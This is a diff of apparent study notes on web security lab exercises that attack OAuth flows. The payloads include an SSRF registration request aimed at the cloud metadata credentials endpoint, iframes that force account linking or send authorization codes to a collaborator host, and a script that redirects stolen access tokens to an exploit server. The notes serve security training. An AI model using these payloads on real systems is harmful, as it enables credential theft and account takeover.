@@ -1,0 +1,63 @@
+- Via implicit flow
+-- You could copy the POST to /authenticate and just change the email to the other users
+
+- SSRF via OpenID dynamic client
+-- Used https://oauth-0a7c00b1035823e181c1aa6102280075.oauth-server.net/.well-known/openid-configuration to determine there was a registration endpoint
+-- This is the request I sent to register
+--------------------------------------------------------------------------------------------
+POST /reg HTTP/2
+Host: oauth-0a7c00b1035823e181c1aa6102280075.oauth-server.net
+Accept-Encoding: gzip, deflate, br
+Accept: */*
+Accept-Language: en-US;q=0.9,en;q=0.8
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.90 Safari/537.36
+Cache-Control: max-age=0
+Content-Type: application/json
+Content-Length: 190
+
+
+{
+    "redirect_uris": [
+     "https://f4k68hwlgz4efj7dcefe8cxr9if93zro.oastify.com"
+        ],
+"logo_uri": "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/"
+}
+--------------------------------------------------------------------------------------------------
+-- The redirect_uris can be anything, however the logo_uri needs to be the SSRF site
+-- -- There is a request to /client/client_id/logo, which gets the logo from the logo_uri
+-- This got the data from the endpoint
+
+- Forced profile linking
+-- If you attach a social media profile, there is a redirect to a oauth-linking endpoint
+-- To exploit this endpoint
+-- -- Use intercept to catch the request, copy the url, and drop the request
+-- -- Logout of your account
+-- -- Deliver an iframe like this to the victim
+<iframe src="https://0a4b00fb0426f6bd809d9ee400be00d7.web-security-academy.net/oauth-linking?code=pLSgAgn6LLIvPunno66onE8uqapCH9DTEOEya7FmUeC"></iframe> 
+-- -- Click log in with social media
+
+- Oauth hijacking via redirect_uri
+-- The redirect_uri set to callback was not validated
+-- Used this iframe on the exploit server to get the victims code
+<iframe src="https://oauth-0a0e00d403dd826f81f223f40276005b.oauth-server.net/auth?client_id=he9xiq5tlkx2nu3svardd&redirect_uri=https://7nvyr9fdzrn6ybq5v6y6r4gjsay1mtai.oastify.com&response_type=code&scope=openid%20profile%20email"></iframe>
+-- Logged in again with intercept turned on
+-- -- When code was passed to callback I changed it to the code a recieved on collaborator
+
+- Stealing access tokens
+-- Apikey was avaliable on oauth/me but we needed a bearer token 
+-- The token was sent in parameters to the redirect_uri
+-- -- However the redirect_uri was only vulnerable to path traversal
+-- -- The next post url was vulnerable to open redirect 
+-- -- This script on exploit server takes advantage of that
+------------------------------------------------------------------------------------------------------
+<script>
+    if (!document.location.hash) {
+        window.location = 'https://oauth-YOUR-OAUTH-SERVER-ID.oauth-server.net/auth?client_id=YOUR-LAB-CLIENT-ID&redirect_uri=https://YOUR-LAB-ID.web-security-academy.net/oauth-callback/../post/next?path=https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/exploit/&response_type=token&nonce=399721827&scope=openid%20profile%20email'
+    } else {
+        window.location = '/?'+document.location.hash.substr(1)
+    }
+</script>
+------------------------------------------------------------------------------------------------------
+-- -- The hash is for the achor part of uri 
+-- -- -- The part after #
+-- -- After delivering to victim the access token is in the log 
